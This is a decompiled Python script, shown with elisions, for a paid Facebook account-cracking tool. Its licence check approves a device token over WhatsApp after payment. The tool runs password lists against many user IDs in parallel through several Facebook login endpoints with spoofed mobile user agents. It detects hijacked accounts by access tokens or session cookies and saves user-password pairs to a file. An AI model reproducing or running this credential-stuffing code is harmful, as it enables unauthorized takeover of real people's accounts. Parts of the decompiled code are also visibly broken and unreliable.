...
# Time Succes decompile : 2022-04-07 07:26:08.108601
try:
...
##     ## ##     ## ########  
 ...
 [*]=============================================
    Author   : AZAN CHAUDRY 
    Facebook : https://facebook.com/AZAN ALI
    Team     : 4L0N3
    Connect  : 03165456679
 [*]=============================================
...
def qsbuy():
    ...
    try:
        ...
        to = (open(bd, 'r').read()).replace('SSB','APL').replace('~','QSR').replace('==','--').replace('C','BAxxS')
    ...
    if to in r:
        ...
        print ('\x1b[1;97m Your Token Not Approved')

        print ('\n\x1b[1;97m Your Token Is : \x1b[92m' + to + '\033[0m')

        ss = to

        input('\nPress Enter')

        tks = 'Hello%20Bro%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+ to

        os.system('am start https://wa.me/+923187475117?text=' + tks)
        ...
        exit('After Payment Then Run Again  .')
...
def qsreg():
    ...
    print ('\x1b[1;97m \033[1;91m•\033[0m Your Token Is Not Approved \033[1;91m•\033[0m\n \033[1;96m• \033[0mThis Tool Is Paid Only 300 Rs \n \033[1;92m•\033[0m Duration : 1 Month Price 300')

    id = str(uuid.uuid1(uuid.getnode(),0))[24:].upper() + "~I-FAIZI=="

    print ('\n\x1b[1;97m Your Token Is : \x1b[92m' + id + '\033[0m')

    ss = id

    input('\n\033[1;91m• \033[0m Press Enter To Get Approval \033[1;91m• \033[0m')

    tks = 'Hello%20Qaiser%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+ id
    ...
    sav = open(bd, 'w').replace('SSB','APL').replace('~','QSR').replace('==','--').replace('C','BAxxS')
...
def xchker():
    ...
    if to in r:
        ...
        qsbuy()
def login():
	os.system("rm -rf access_token.txt");print(logo);xchker()
...
def hasil(ok,cp):
    if len(ok) != 0 or len(cp) != 0:
        ...
        #FAIZI_FAIZAN('\033[1;91mCHECK > %s'%(str(len(cp))));exit()
    else:
...
class __crack__:
    ...
    def plerr(self):
        try:
            ...
            print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=============================================');xchker()
        ...
        if _jokowi_kontol_ in ('M', 'm'):
            ...
            while True:
                ...
                if pwek == '':
                    ...
                    print('\n01.) Metode b-api ')
                    print('02.) Metode mbasic ')
                    print('03.) Metode Mobile ')
                    _sempak_(pwek.split(','))
                    break
            ...
            print(' [1] Method 1 ')
            print(' [2] Method 2  [ ONLY FOR OK IDZ ]')
            print(' [3] Method 3 ')
            print (' \x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m=============================================')
            self.__pler__()
        else:
    ...
    def __api__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;92m [Cracking] %s/%s  \033[1;92mOK-:%s / \033[1;91mCP-:%s'%(loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if "access_token" in p:
                print('\r\033[1;92m[ok] %s | %s%s      '%(user,pw,tahun(user)))
                ...
                try:
                    ...
                    print('\r\033[1;92m[ok]  %s | %s • %s %s %s%s      '%(user,pw,day,month,year,tahun(user)))
                    ...
                    pass
                print('\r\033[1;91m[cp] %s | %s%s      '%(user,pw,tahun(user)))
                wrt = '%s - %s%s' % (user,pw,tahun(user))
                cp.append(wrt)
    ...
    def __mbasic__(self, user, _sempak_):
        global ok,cp,loop
        sys.stdout.write('\r\033[1;92m [Cracking] %s/%s  \033[1;92mOK-:%s '%(loop,len(self.id),len(ok))),
        sys.stdout.flush()
        for pw in _sempak_:
            pw = pw.lower()
            try: os.mkdir('')
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;32m[ok]  %s | %s      ' % (user,pw))
                wrt = '%s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __mfb__(self, user, _sempak_):
        ...
        for pw in _sempak_:
            ...
            if 'c_user' in ses.cookies.get_dict():
                print('\r\033[1;92m[ok]  %s | %s      '%(user,pw))
                wrt = '%s - %s - %s' % (user,pw)
                ok.append(wrt)
                open('OK.txt','a').write('%s\n' % wrt)
                break
    ...
    def __pler__(self):
        ...
        if yan == '':
            ...
            os.system('clear');print(logo);print('\n[•] Result OK saved to ok.txt')
            print('[•] Result CP saved to cp.txt')
            with ThreadPoolExecutor(max_workers=35) as (_ngentot_gratis_):
...
openak_ua_xaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
openak_ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
openak_ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
openak_ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
openak_ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
openak_ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
openak_ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
openak_ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
